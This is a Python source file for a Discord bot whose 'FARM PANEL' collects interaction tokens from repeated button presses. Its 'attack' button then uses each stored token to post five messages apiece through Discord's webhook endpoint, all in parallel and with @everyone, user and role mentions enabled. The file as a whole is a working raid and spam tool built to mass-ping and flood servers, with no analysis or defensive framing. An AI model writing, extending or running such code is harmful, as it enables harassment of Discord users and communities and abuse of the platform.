import asyncio
import aiohttp
import discord
from discord import AllowedMentions

from utils.config import DEFAULT_BUTTON_MESSAGE
from utils.db import get_global_default_message, get_custom_message
from utils.helpers import user_farm_tokens


def make_farm_panel(user_id: int, token_count: int = 0):
    message_count = token_count * 5

    class FarmPanel(discord.ui.LayoutView):
        container1 = discord.ui.Container(
            discord.ui.TextDisplay(content="FARM PANEL"),
            discord.ui.TextDisplay(content=f"stored tokens: **{token_count}**\nmessages you can send **{message_count}**"),
            discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.secondary,
                    label="FARM",
                    custom_id="83d8a9b0052c44e1b7f2d99648e57780",
                ),
                discord.ui.Button(
                    style=discord.ButtonStyle.secondary,
                    label="FARM",
                    custom_id="d464c1b80bf24413e84ec24aa2d21712",
                ),
                discord.ui.Button(
                    style=discord.ButtonStyle.secondary,
                    label="FARM",
                    custom_id="e0f948640c114d1f9b09e6b2c866a167",
                ),
                discord.ui.Button(
                    style=discord.ButtonStyle.secondary,
                    label="FARM",
                    custom_id="512621409dcf4c17c3f43c26142784a4",
                ),
                discord.ui.Button(
                    style=discord.ButtonStyle.secondary,
                    label="FARM",
                    custom_id="2b89e9b10c7e41e195a3a2d46be14839",
                ),
            ),
            discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.danger,
                    label="attack!1!!!u",
                    custom_id="25bc77ecdea348afe7d2a759bcb1a344",
                ),
            ),
        )

        def __init__(self):
            super().__init__(timeout=None)
            self.user_id = user_id

        async def interaction_check(self, interaction: discord.Interaction) -> bool:
            cid = interaction.data.get("custom_id")
            uid = interaction.user.id

            if uid not in user_farm_tokens:
                user_farm_tokens[uid] = []

            farm_ids = [
                "83d8a9b0052c44e1b7f2d99648e57780",
                "d464c1b80bf24413e84ec24aa2d21712",
                "e0f948640c114d1f9b09e6b2c866a167",
                "512621409dcf4c17c3f43c26142784a4",
                "2b89e9b10c7e41e195a3a2d46be14839",
            ]

            if cid in farm_ids:
                token = interaction.token
                user_farm_tokens[uid].append(token)
                new_token_count = len(user_farm_tokens[uid])

                await interaction.response.defer()
                await interaction.edit_original_response(view=make_farm_panel(uid, new_token_count))
                return False

            if cid == "25bc77ecdea348afe7d2a759bcb1a344":
                if uid not in user_farm_tokens or len(user_farm_tokens[uid]) == 0:
                    await interaction.response.send_message("You don't have any stored tokens! Farm some tokens first.", ephemeral=True)
                    return False

                await interaction.response.defer()

                tokens = user_farm_tokens[uid]

                global_msg = await get_global_default_message()
                custom_msg = await get_custom_message(str(uid))
                msg = global_msg if global_msg else (custom_msg if custom_msg else DEFAULT_BUTTON_MESSAGE)

                allowed = AllowedMentions(everyone=True, users=True, roles=True)

                async def send_5_messages(tok):
                    app_id = interaction.client.application_id
                    webhook_url = f"https://discord.com/api/webhooks/{app_id}/{tok}"
                    payload = {
                        "content": msg,
                        "allowed_mentions": {"parse": ["everyone", "users", "roles"]}
                    }
                    async with aiohttp.ClientSession() as session:
                        for _ in range(5):
                            try:
                                async with session.post(webhook_url, json=payload) as resp:
                                    if resp.status not in (200, 204):
                                        text = await resp.text()
                                        print(f"Error sending message: {resp.status} - {text}")
                            except Exception as e:
                                print(f"Error sending message: {e}")

                await asyncio.gather(*[send_5_messages(t) for t in tokens])

                total_messages = len(tokens) * 5
                user_farm_tokens[uid] = []

                await interaction.edit_original_response(view=make_farm_panel(uid, 0))
                await interaction.followup.send(f"Attack complete! Sent {total_messages} messages.", ephemeral=True)
                return False

            return True

    return FarmPanel()
